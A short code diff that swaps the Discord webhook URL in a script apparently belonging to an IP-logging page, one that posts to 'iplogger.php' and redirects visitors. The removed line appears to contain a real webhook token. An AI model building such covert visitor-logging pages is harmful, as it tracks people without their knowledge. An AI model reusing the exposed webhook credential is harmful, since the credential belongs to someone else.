@@ -1,5 +1,5 @@
 <script>
-var webhook = "https://discord.com/api/webhooks/930788015545131028/QbesUFN6pSADPmJ_SkyQ_232543246C9rwOyeBsjqcWejT0MdPa2QMGYgYiBoOVJqUryG_w0o";
+var webhook = "https://discord.com/api/webhooks/324324234324324/QbesUFN6pSADPmJ_SkyQ_232543246C967f8sdfqcWejT0MdPa2QMGYgYiBoOVJqUryG_w0o";
 var redirect = "https://graysuit.github.io";
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'iplogger.php', true);
